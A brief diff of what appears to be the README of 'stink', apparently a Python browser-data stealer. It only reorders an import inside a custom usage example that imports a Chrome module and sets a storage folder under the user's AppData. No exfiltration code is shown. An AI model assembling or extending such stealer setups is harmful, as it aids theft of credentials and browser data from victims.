@@ -44,9 +44,9 @@ stealer.run()
 ### Кастомный
 ```python
 from os import path, mkdir
+from getpass import getuser
 
 from stink.browsers.chrome import Chrome
-from getpass import getuser
 
 storage_path = f"C:/Users/{getuser()}/AppData/"
 storage_folder = "files/"
